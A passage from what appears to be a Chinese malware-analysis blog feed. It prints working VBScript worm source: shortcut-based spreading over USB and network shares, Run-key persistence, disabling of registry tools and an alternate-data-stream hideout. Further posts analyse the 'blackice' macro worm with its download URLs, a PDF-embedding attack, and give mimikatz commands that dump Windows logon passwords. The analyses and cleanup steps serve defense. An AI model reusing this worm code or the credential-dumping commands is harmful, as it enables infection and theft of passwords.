<span class="hljs-keyword">In</span> drop                      <br><span class="hljs-keyword">If</span> <span class="hljs-built_in">Day</span>(now) Mod <span class="hljs-number">3</span> = ww <span class="hljs-keyword">Then</span> shorZvnita path+<span class="hljs-string">&quot;\&quot;</span>+d,d<br>wscript.sleep <span class="hljs-number">60</span><br>ww=ww+<span class="hljs-number">1</span><br><span class="hljs-keyword">Next</span><br>r=<span class="hljs-number">0</span><br><span class="hljs-keyword">For</span> <span class="hljs-keyword">Each</span> fldr <span class="hljs-keyword">In</span> fso.GetFolder(path+<span class="hljs-string">&quot;\&quot;</span>).SubFolders        <span class="hljs-comment">&#x27;我的文档文件夹</span><br>shorZvnita path+<span class="hljs-string">&quot;\&quot;</span>+fldr.name,fldr.Name<br>wscript.sleep <span class="hljs-number">60</span><br><span class="hljs-keyword">If</span> r&gt;<span class="hljs-number">3</span> <span class="hljs-keyword">Then</span> <br><span class="hljs-keyword">Exit</span> <span class="hljs-keyword">For</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">if</span><br>r=r+<span class="hljs-number">1</span><br><span class="hljs-keyword">Next</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Sub</span><br><br><span class="hljs-keyword">Sub</span> shorZvnita(path,trgt)                    <span class="hljs-comment">&#x27;创建超链接文件</span><br><span class="hljs-keyword">Set</span> shor=ws.CreateShortcut(path+<span class="hljs-string">&quot;.lnk&quot;</span>)<br>shor.iconlocation=<span class="hljs-string">&quot;shell32.dll,3&quot;</span><br>shor.targetpath=<span class="hljs-string">&quot;wscript.exe&quot;</span><br>shor.arguments=<span class="hljs-string">&quot;//e:VBScript thumb.db &quot;&quot;&quot;</span>+trgt+<span class="hljs-string">&quot;&quot;&quot;&quot;</span><br>shor.save<br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Sub</span><br><br><span class="hljs-keyword">function</span> attack_net()<br><span class="hljs-keyword">On</span> <span class="hljs-keyword">Error</span> <span class="hljs-keyword">Resume</span> <span class="hljs-keyword">Next</span><br>err.clear<br><span class="hljs-keyword">Set</span> objFolder = sh.Name<span class="hljs-built_in">space</span>(&amp;H13&amp;)              <span class="hljs-comment">&#x27;network shortcuts网络位置</span><br><span class="hljs-keyword">Set</span> colItems = objFolder.Items<br><span class="hljs-keyword">For</span> <span class="hljs-keyword">Each</span> strFileName <span class="hljs-keyword">in</span> objFolder.Items          <span class="hljs-comment">&#x27;遍历网络位置</span><br>t= objFolder.GetDetailsOf(strFileName, <span class="hljs-number">14</span>)<br><span class="hljs-keyword">if</span> fso.folderexists(t) <span class="hljs-keyword">then</span>                      <span class="hljs-comment">&#x27;感染</span><br>rekursif t,<span class="hljs-number">4</span><br><span class="hljs-keyword">end</span> <span class="hljs-keyword">if</span><br><span class="hljs-keyword">Next</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">function</span><br><br><span class="hljs-keyword">Sub</span> tdr()<br><span class="hljs-keyword">On</span> <span class="hljs-keyword">Error</span> <span class="hljs-keyword">Resume</span> <span class="hljs-keyword">Next</span><br>err.clear<br>WScript.Sleep <span class="hljs-number">180000</span><br><span class="hljs-keyword">if</span> err.number&gt;<span class="hljs-number">0</span> <span class="hljs-keyword">then</span> wscript.quit<br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Sub</span><br><br><span class="hljs-keyword">function</span> UNISKA()                                <span class="hljs-comment">&#x27;写v.doc</span><br><span class="hljs-keyword">On</span> <span class="hljs-keyword">error</span> <span class="hljs-keyword">resume</span> <span class="hljs-keyword">next</span><br>x=vbcrlf<br>adv=<span class="hljs-string">&quot;Yuyun Ver 1.0 ^_^!==================&gt;&gt;Bukan dari tulang ubun ia dicipta&gt;karna berbahaya membiarkannya dalam sanjung dan puja&gt;tak juga dari tulang kaki&gt;karna nista membuatnya diinjak dan diperbudak&gt;tapi dari tulang rusuk bagian kiri&gt;dekat ke hati untuk disayangi&gt;dekat ke tangan untuk dilindungi&gt;&gt;(dikutip dr: Agar Bidadari Cemburu Padamu)&gt;&gt;&gt;&quot;&quot;Janganlah kamu bersikap lemah, dan janganlah (pula) kamu bersedih hati, padahal kamulah&gt;orang-orang yang paling tinggi (derajatnya), jika kamu orang-orang yang beriman.&quot;&quot;&gt;(QS. Ali Imran:139)&gt;&gt;&gt;Katakanlah kepada orang laki-laki yang beriman: &quot;&quot;Hendaklah mereka menahan pandanganya, &gt;dan memelihara kemaluannya; yang demikian itu adalah lebih suci bagi mereka, &gt;sesungguhnya Allah Maha Mengetahui apa yang mereka perbuat.&quot;&quot; (QS. An Nur:30)&gt;&gt;Katakanlah kepada wanita yang beriman: &quot;&quot;Hendaklah mereka menahan pandangannya, &gt;dan kemaluannya, dan janganlah mereka menampakkan perhiasannya, kecuali yang &gt;(biasa) nampak dari padanya. Dan hendaklah mereka menutupkan kain kudung &gt;kedadanya....&quot;&quot; (QS. An Nur:30)&gt;&gt;Sorry I just Nitip Print thok....Ndak pa2 khan^_^!  www.muslimah.or.id &gt;&gt;Hai anak Adam, sesungguhnya Kami telah menurunkan kepadamu &gt;pakaian untuk menutup auratmu dan pakaian indah untuk perhiasan.&gt;Dan pakaian takwa itulah yang paling baik. Yang demikian itu adalah &gt;sebahagian dari tanda-tanda kekuasaan Allah, mudah-mudahan mereka selalu ingat.(Al-A&#x27;raf:26)&quot;</span><br><br>adv=<span class="hljs-built_in">replace</span>(adv,<span class="hljs-string">&quot;&gt;&quot;</span>,x)<br><span class="hljs-keyword">set</span> Yu2n=fso.opentextfile(tmp+<span class="hljs-string">&quot;\v.doc&quot;</span>,<span class="hljs-number">2</span>,<span class="hljs-literal">true</span>)<br>Yu2n.write adv<br>Yu2n.close<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">day</span>(now)=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-built_in">month</span>(now)mod <span class="hljs-number">3</span>)=<span class="hljs-number">1</span> <span class="hljs-keyword">then</span> <br><span class="hljs-keyword">if</span> fly=<span class="hljs-literal">false</span> <span class="hljs-keyword">then</span><br><span class="hljs-keyword">for</span> i=<span class="hljs-number">1</span> <span class="hljs-keyword">to</span> <span class="hljs-number">3</span><br>ws.run <span class="hljs-string">&quot;notepad.exe /p &quot;&quot;&quot;</span>+tmp+<span class="hljs-string">&quot;\v.doc&quot;&quot;&quot;</span><br><span class="hljs-keyword">next</span><br><span class="hljs-keyword">end</span> <span class="hljs-keyword">if</span><br><span class="hljs-keyword">end</span> <span class="hljs-keyword">if</span><br><span class="hljs-keyword">set</span> UNISKA=fso.getfile(tmp+<span class="hljs-string">&quot;\v.doc&quot;</span>)<br><span class="hljs-keyword">end</span> <span class="hljs-keyword">function</span><br><br><span class="hljs-keyword">Sub</span> regQ()                                             <span class="hljs-comment">&#x27;修改注册表，设置桌面快捷方式、实现自启动</span><br><span class="hljs-keyword">On</span> <span class="hljs-keyword">Error</span> <span class="hljs-keyword">Resume</span> <span class="hljs-keyword">Next</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">day</span>(now)=<span class="hljs-number">1</span> <span class="hljs-keyword">then</span>                                     <span class="hljs-comment">&#x27;每月一日</span><br>ws.RegWrite <span class="hljs-string">&quot;HKCR\CLSID\&#123;11111111-2222-3333-4444-555555555555&#125;\&quot;</span>, <span class="hljs-string">&quot;Yuyun_Cantix&quot;</span><br>ws.RegWrite <span class="hljs-string">&quot;HKCR\CLSID\&#123;11111111-2222-3333-4444-555555555555&#125;\DefaultIcon\&quot;</span>,<span class="hljs-string">&quot;shell32.dll,48&quot;</span><br>ws.RegWrite <span class="hljs-string">&quot;HKCR\CLSID\&#123;11111111-2222-3333-4444-555555555555&#125;\ShellFolder\Attributes&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&quot;REG_DWORD&quot;</span><br>ws.regwrite <span class="hljs-string">&quot;HKLM\Software\Microsoft\Windows\CurrentVersion\explorer\Desktop\NameSpace\&#123;11111111-2222-3333-4444-555555555555&#125;\&quot;</span>,<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">end</span> <span class="hljs-keyword">if</span><br>ws.regdelete <span class="hljs-string">&quot;HKCR\lnkfile\IsShortcut&quot;</span><br>ws.RegWrite <span class="hljs-string">&quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Explorer&quot;</span>,<span class="hljs-string">&quot;Wscript.exe //e:VBScript &quot;&quot;&quot;</span>+docx+<span class="hljs-string">&quot;\database.mdb&quot;&quot;&quot;</span><br>ws.RegWrite <span class="hljs-string">&quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistrytools&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&quot;REG_DWORD&quot;</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">lcase</span>(fso.getdrive(<span class="hljs-string">&quot;c:&quot;</span>).FileSystem)=<span class="hljs-string">&quot;ntfs&quot;</span> <span class="hljs-keyword">then</span><br>iraQ=AQ.openastextstream(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>).read(AQ.size)<br>www=fso.GetSpecialFolder(<span class="hljs-number">0</span>)<br><span class="hljs-keyword">set</span> jjk=fso.opentextfile(www+<span class="hljs-string">&quot;\:Microsoft Office Update for Windows XP.sys&quot;</span>,<span class="hljs-number">2</span>,<span class="hljs-literal">true</span>)<br>jjk.write iraQ<br>jjk.close<br>ws.RegWrite <span class="hljs-string">&quot;HKLM\Software\Microsoft\Windows\CurrentVersion\Run\WinUpdate&quot;</span>,<span class="hljs-string">&quot;Wscript.exe //e:VBScript &quot;&quot;&quot;</span>+www+<span class="hljs-string">&quot;\:Microsoft Office Update for Windows XP.sys&quot;&quot;&quot;</span>   <span class="hljs-comment">&#x27;自启动</span><br><span class="hljs-keyword">end</span> <span class="hljs-keyword">if</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Sub</span><br><br><span class="hljs-keyword">Sub</span> Hertz(ooo)<br><span class="hljs-keyword">On</span> <span class="hljs-keyword">Error</span> <span class="hljs-keyword">Resume</span> <span class="hljs-keyword">Next</span><br><span class="hljs-keyword">do</span><br><span class="hljs-keyword">For</span> <span class="hljs-keyword">Each</span> drv <span class="hljs-keyword">In</span> fso.Drives     <span class="hljs-comment">&#x27;遍历驱动器</span><br><span class="hljs-keyword">If</span> drv.DriveType=<span class="hljs-number">1</span> <span class="hljs-keyword">Then</span>        <span class="hljs-comment">&#x27;可移动驱动器</span><br>rekursif drv.Path,<span class="hljs-number">4</span><br><span class="hljs-keyword">Else</span>                           <span class="hljs-comment">&#x27;其他驱动器</span><br>rekursif drv.Path,<span class="hljs-number">2</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">if</span><br><span class="hljs-keyword">Next</span><br><span class="hljs-keyword">if</span> fly=<span class="hljs-literal">false</span> <span class="hljs-keyword">then</span> <br>tdr<br><span class="hljs-keyword">else</span> <br>wscript.quit<br><span class="hljs-keyword">end</span> <span class="hljs-keyword">if</span><br>regQ<br><span class="hljs-keyword">If</span> ooo=<span class="hljs-literal">False</span> <span class="hljs-keyword">Then</span> <br><span class="hljs-keyword">Exit</span> <span class="hljs-keyword">Do</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br><span class="hljs-keyword">loop</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Sub</span><br></code></pre></td></tr></table></figure><p>主要函数功能如下：</p><p><strong>Sub rekursif(path,dp)</strong> 负责递归目录，path是目录路径，dp是递归目录层数</p><p><strong>Sub dropf(path)</strong> 负责复制传播的函数，主要就是复制autorun.inf、Thumb.db到目录下</p><p><strong>Sub shorZvnita(path,trgt)</strong> 创建包含指定命令的超链接文件</p><p><strong>function attack_net()</strong> 负责网络位置传播，即局域网内传播</p><p><strong>Sub tdr()</strong> 负责错误检查</p><p><strong>function UNISKA()</strong> 写入v.doc文件，包含指定内容，内容无实质意义</p><p><strong>Sub regQ()</strong>   注册表操作，包括创建桌面快捷方式、开机自启动</p><p><strong>Sub Hertz(ooo)</strong>  遍历驱动器，在本地和可移动介质目录进行复制传播</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>样本主要功能为：修改注册表，大量创建包含指定命令的超链接文件，复制病毒到主机文件夹目录下，并通过可移动介质盘和网络位置进行传播。总之，危害不大，传播性不强。但是这是第一次见到的纯vbs脚本病毒，以前遇见的vbs多作为中间衍生物或者下载器。</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
    
    
    <categories>
      
      <category>样本分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vbs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>blackice病毒分析</title>
    <link href="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    <url>/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>捕获到的宏病毒样本，可以通过拼接字符串生成exe，比较老的蠕虫病毒，分析如下：</p><h2 id="宏样本分析"><a href="#宏样本分析" class="headerlink" title="宏样本分析"></a>宏样本分析</h2><h3 id="核心功能"><a href="#核心功能" class="headerlink" title="核心功能"></a>核心功能</h3><p>宏代码通过感染office文件及宏模板进行传播，执行后会在系统的Temp文件夹下生成“bk_****.tmp”文件并调用，最终生成blackice.exe</p><h3 id="宏代码分析"><a href="#宏代码分析" class="headerlink" title="宏代码分析"></a>宏代码分析</h3><p>拼接将要写入tmp文件的字符串</p><img src="1-16541516283931.png" alt="1" style="zoom:67%;" /><p>获取系统Temp文件夹路径，随机生成tmp文件的名字（格式为“bk_****.tmp”），并创建与之对应的tmp文件</p><p> <img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602143412773.png" alt="image-20220602143412773"></p><p>用上面拼接的字符串解密出一个PE文件的内容，并将其写入tmp文件中</p><p> <img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602143422561.png" alt="image-20220602143422561"></p><p>执行生成的tmp文件</p><p> <img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602143431482.png" alt="image-20220602143431482"></p><p>感染office文档的函数模块</p><p> <img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602143439457.png" alt="image-20220602143439457"></p><p>感染office模板的函数模块</p><p> <img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602143448296.png" alt="image-20220602143448296"></p><h2 id="病毒样本基本信息"><a href="#病毒样本基本信息" class="headerlink" title="病毒样本基本信息"></a>病毒样本基本信息</h2><h3 id="样本名称：blackice-exe"><a href="#样本名称：blackice-exe" class="headerlink" title="样本名称：blackice.exe"></a>样本名称：blackice.exe</h3><h3 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h3><p> <img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602143641966.png" alt="image-20220602143641966"></p><h3 id="样本hash"><a href="#样本hash" class="headerlink" title="样本hash"></a>样本hash</h3><p>MD5: C89CDBA61B9B4D882698A084A25907D3</p><p>SHA1: D77E96CEA7F7EF38034D52CAE2A4E4FDE29C37CA</p><h2 id="病毒样本分析"><a href="#病毒样本分析" class="headerlink" title="病毒样本分析"></a>病毒样本分析</h2><p>经查壳可知为C++写的，无壳</p><p> <img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602143727402.png" alt="image-20220602143727402"></p><p><img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602143747142.png" alt="image-20220602143747142"></p><p>使用IDA pro对文件进行分析</p><h3 id="WinMain"><a href="#WinMain" class="headerlink" title="WinMain"></a>WinMain</h3><p>创建互斥量，防止多个blackice进程同时启动</p><p> <img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602143830187.png" alt="image-20220602143830187"></p><p>判断系统是不是Windows 7, Windows Server 2008, Windows Vista, Windows Server 2003, Windows XP或者Windows 2000，不是则直接退出进程，获取系统路径</p><p> <img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602143837856.png" alt="image-20220602143837856"></p><p>获取主机信息，提权获得SeDebugPrivilege权限，将自身复制并重命名为blackice.exe，kernel.dll，对explorer.exe进程进行注入</p><p> <img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602143844024.png" alt="image-20220602143844024"></p><p>创建线程修改注册表，远程下载并执行文件，结束杀软进程，感染office宏模板，可移动磁盘和磁盘。</p><p> <img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602143850840.png" alt="image-20220602143850840"></p><h3 id="sub-404F0B"><a href="#sub-404F0B" class="headerlink" title="sub_404F0B"></a>sub_404F0B</h3><p>获取主机名，硬盘信息，卷序列号和MAC地址</p><p> <img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602143901016.png" alt="image-20220602143901016"></p><p> <img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602143908961.png" alt="image-20220602143908961"></p><h3 id="sub-404E89"><a href="#sub-404E89" class="headerlink" title="sub_404E89"></a>sub_404E89</h3><p>提升进程权限，使其具有SeDebugPrivilege权限</p><p> <img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602143917158.png" alt="image-20220602143917158"></p><h3 id="sub-404CB2"><a href="#sub-404CB2" class="headerlink" title="sub_404CB2"></a>sub_404CB2</h3><p>检查是否存在blackice.exe和kernel.dll，如果不存在则将自身复制过去</p><p> <img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602144042379.png" alt="image-20220602144042379"></p><h3 id="sub-404384"><a href="#sub-404384" class="headerlink" title="sub_404384"></a>sub_404384</h3><p>注入exeplorer.exe进程，用于进程保护，获取exeplorer.exe的pid，然后写入shellcode，通过启动远程线程的方式启用shellcode</p><p> <img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602144201249.png" alt="image-20220602144201249"></p><h3 id="sub-404A71"><a href="#sub-404A71" class="headerlink" title="sub_404A71"></a>sub_404A71</h3><p>注入线程创建注册表实现自启动</p><p> <img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602144212246.png" alt="image-20220602144212246"></p><h3 id="sub-403D93"><a href="#sub-403D93" class="headerlink" title="sub_403D93"></a>sub_403D93</h3><p>从指定地址下载文件并写入blackice.ini文件，然后执行下载文件</p><p> <img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602144220779.png" alt="image-20220602144220779"></p><p> <img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602144227708.png" alt="image-20220602144227708"></p><h3 id="sub-4050AC"><a href="#sub-4050AC" class="headerlink" title="sub_4050AC"></a>sub_4050AC</h3><p>查询指定杀软进程名称，并结束对应的杀软进程及其对应的线程</p><p> <img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602144236102.png" alt="image-20220602144236102"></p><p> <img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602144243740.png" alt="image-20220602144243740"></p><h3 id="sub-403105"><a href="#sub-403105" class="headerlink" title="sub_403105"></a>sub_403105</h3><p>修改宏安全设置，感染office宏模板以实现宏病毒的传播</p><p> <img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602144251150.png" alt="image-20220602144251150"></p><p> <img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602144258413.png" alt="image-20220602144258413"></p><h3 id="sub-404999"><a href="#sub-404999" class="headerlink" title="sub_404999"></a>sub_404999</h3><p>注册watchusb窗口类并创建该类窗口，监视磁盘变更的消息，如果是可移动磁盘则对其进行感染，并感染其中的目标文件</p><p> <img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602144306472.png" alt="image-20220602144306472"></p><p> <img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602144314910.png" alt="image-20220602144314910"></p><h3 id="sub-403771"><a href="#sub-403771" class="headerlink" title="sub_403771"></a>sub_403771</h3><p>感染磁盘和网络资源文件</p><p> <img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602144324735.png" alt="image-20220602144324735"></p><p> <img src="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220602144330415.png" alt="image-20220602144330415"></p><h2 id="功能总结"><a href="#功能总结" class="headerlink" title="功能总结"></a>功能总结</h2><p>1、 复制自身到%windir%\system32\blackice.exe和%windir%\system32\kernel.dll文件。</p><p>2、 通过修改注册表设置word，execl的安全级别和实现开机自启动，用来实现病毒传播和持久化攻击。</p><p>3、 连接h_ttp:&#x2F;&#x2F;fmtwld.zj.com&#x2F;blackice&#x2F;url.txt和h_ttp:&#x2F;&#x2F;fmtwld.vicp.net&#x2F;blackice&#x2F;url.txt试图下载数据到本地，保存为%windir%\system32\blackice.ini文件运行。</p><p>4、 查询指定杀软进程名称，并结束对应的杀软进程及其对应的线程。</p><p>5、 注入explorer.exe进程来实现进程保护。</p><p>6、 通过感染本地磁盘，可移动磁盘和网络资源中的exe，xls，doc文件实现传播。</p><h2 id="处置建议"><a href="#处置建议" class="headerlink" title="处置建议"></a>处置建议</h2><p>1、 立即对被感染病毒的机器进行断网处理，防止病毒的后续攻击和进一步传播。</p><p>2、 删除%windir%\system32目录下的blackice.exe，kernel.dll和blackice.ini文件。</p><p>3、 使用专业杀毒软件对被感染系统和在被感染系统上使用过的可移动磁盘进行全盘查杀。</p><p>4、 删除注册表HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\run，HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\shell的相关的自启动键，修改注册表HKEY_CURRENT_USER\software\microsoft\office...\word(execl)\security还原word和execl的安全级别。</p><p>5、 删除病毒所创建的宏模板。</p>]]></content>
    
    
    <categories>
      
      <category>样本分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>blackice</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PDF嵌入攻击</title>
    <link href="/2022/05/25/PDF%E5%B5%8C%E5%85%A5%E6%94%BB%E5%87%BB/"/>
    <url>/2022/05/25/PDF%E5%B5%8C%E5%85%A5%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<p>前两天无意看到某公众号推送的文章</p><p><a href="https://www.freebuf.com/news/333958.html">https://www.freebuf.com/news/333958.html</a></p><p>看起来是外文搬运，PDF文件似曾相识，在某客户单位的监测设备上看到过，再拿出来瞧瞧</p><p><a href="https://www.bleepingcomputer.com/news/security/pdf-smuggles-microsoft-word-doc-to-drop-snake-keylogger-malware/">外文原文</a></p><img src="image-20220525142158793.png" alt="样本信息" style="zoom:67%;" /><p>当时就感觉很有意思，原理很简单，但是静态免杀效果很好，截至今天卡巴和火绒都免杀，虽然运行起来大概率会被杀</p><p>其实就是很简单的PDF嵌入，执行JS代码(exportDataObject)</p><p><img src="/2022/05/25/PDF%E5%B5%8C%E5%85%A5%E6%94%BB%E5%87%BB/image-20220525142651194.png" alt="JavaScript代码"></p><p>exportDataObject函数包含 2 个参数的对象： </p><ul><li>cName，嵌入对象的名称</li><li>nLaunch，关于 PDF 阅读器应如何处理导出对象的说明</li></ul><p>nLaunch是一个整数，它具有三个有效值： </p><ol><li>提示用户输入路径并将文件保存在那里 </li><li>提示用户输入路径，保存文件，并要求操作系统打开它 </li><li>选择一个临时位置，将文件保存在那里，并要求操作系统打开它</li></ol><p><img src="/2022/05/25/PDF%E5%B5%8C%E5%85%A5%E6%94%BB%E5%87%BB/image-20220525142748304.png" alt="嵌入的word文件"></p><p>包含的docx文件包含CVE-2017-0199漏洞，发起请求htt_ps:&#x2F;&#x2F;<a href="mailto:&#103;&#105;&#116;&#104;&#x75;&#x62;&#46;&#x63;&#x6f;&#x6d;&#x40;&#x32;&#x6c;&#46;&#108;&#118;">&#103;&#105;&#116;&#104;&#x75;&#x62;&#46;&#x63;&#x6f;&#x6d;&#x40;&#x32;&#x6c;&#46;&#108;&#118;</a>&#x2F;26，实际跳转到</p><p>htt_p:&#x2F;&#x2F;192.227.196.211&#x2F;dhl_shp&#x2F;doc_000909000.doc，但是已经挂了，应该是HTA文件执行下一步攻击</p><p>真的是一步三折</p><p><img src="/2022/05/25/PDF%E5%B5%8C%E5%85%A5%E6%94%BB%E5%87%BB/image-20220525150923518.png" alt="通联地址"></p><p>类似的样本分析<a href="https://www.52pojie.cn/thread-1041653-1-1.html">https://www.52pojie.cn/thread-1041653-1-1.html</a></p><p>利用的同外文原文一样都有CVE-2017-11882</p><p>找到两个国外PDF嵌入攻击教程，比较老了，多是嵌入PE文件，不像这个样本绕了一圈，可以以后弄得玩</p><p><a href="https://ironhackers.es/en/tutoriales/pdf-malicioso-en-windows-10-con-settingcontent-ms-embebido/">https://ironhackers.es/en/tutoriales/pdf-malicioso-en-windows-10-con-settingcontent-ms-embebido/</a></p><p><a href="https://nora.codes/post/pdf-embedding-attacks/">https://nora.codes/post/pdf-embedding-attacks/</a></p>]]></content>
    
    
    <categories>
      
      <category>样本分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PDF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用mimikatz获取账号密码</title>
    <link href="/2022/05/24/%E4%BD%BF%E7%94%A8mimikatz%E8%8E%B7%E5%8F%96%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/"/>
    <url>/2022/05/24/%E4%BD%BF%E7%94%A8mimikatz%E8%8E%B7%E5%8F%96%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h3 id="事由"><a href="#事由" class="headerlink" title="事由"></a>事由</h3><p>翻看以前的文件夹突然看到mimikatz，突然想到之前遇到过一个挖矿的传染病毒，python2.7写的，几千行太多了，当时就懒得仔细看，毕竟都是源代码。好像里面有这个模块，就随便写了写，mimikatz主要也是用于内网渗透，密码收集的吧</p><p><img src="/2022/05/24/%E4%BD%BF%E7%94%A8mimikatz%E8%8E%B7%E5%8F%96%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/image-20220524140354511.png" alt="image-20220524140354511"></p><p><img src="/2022/05/24/%E4%BD%BF%E7%94%A8mimikatz%E8%8E%B7%E5%8F%96%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/image-20220524135921116.png" alt="image-20220524135921116"></p><h3 id="mimikatz简介"><a href="#mimikatz简介" class="headerlink" title="mimikatz简介"></a>mimikatz简介</h3><p>mimikatz是法国人Benjamin Delpy编写的一款轻量级的调试工具，在内网渗透过程中，它多数时候是作为一款抓取用户口令的工具，属于内网渗透必备工具之一，被很多人称之为密码抓取神器。然而Mimikatz其实并不只有抓取口令这个功能，它还能够创建票证、票证传递、hash传递，甚至伪造域管理凭证令牌等诸多功能。</p><p><a href="https://github.com/gentilkiwi/mimikatz/">https://github.com/gentilkiwi/mimikatz/</a></p><h3 id="使用mimikatz直接获取账号密码"><a href="#使用mimikatz直接获取账号密码" class="headerlink" title="使用mimikatz直接获取账号密码"></a>使用mimikatz直接获取账号密码</h3><p>mimikatz读取明文密码和hash时需要管理员权限</p><p>然后依次执行</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">privilege::debug                <span class="hljs-regexp">//</span>提升至debug权限<br>sekurlsa::logonpasswords        <span class="hljs-regexp">//</span>抓取密码<br><br>或者<br>mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonPasswords full&quot;</span> &gt; pssword.txt <span class="hljs-keyword">exit</span>          <span class="hljs-regexp">//</span>结果输出到pssword.txt<br></code></pre></td></tr></table></figure><img src="屏幕截图095447.png" alt="屏幕截图095447" style="zoom: 67%;" /><p>Windows10比较麻烦，执行命令后需要将相应SHA1值解密，获取密码</p><p>（网上有人说可以通过修改注册表的方式抓取明文，尝试后发现显示 _TBAL_并没有显示明文密码，不知道哪里出的问题）</p><p><img src="/2022/05/24/%E4%BD%BF%E7%94%A8mimikatz%E8%8E%B7%E5%8F%96%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE101038.png" alt="屏幕截图101038"></p><p>解码网站：<a href="https://www.somd5.com/">https://www.somd5.com/</a></p><p><img src="/2022/05/24/%E4%BD%BF%E7%94%A8mimikatz%E8%8E%B7%E5%8F%96%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/image-20220524102018844.png" alt="image-20220524102018844"></p><h3 id="Procdump-mimikatz配合抓取密码"><a href="#Procdump-mimikatz配合抓取密码" class="headerlink" title="Procdump+mimikatz配合抓取密码"></a>Procdump+mimikatz配合抓取密码</h3><p>mimikatz容易被杀软查杀，而<a 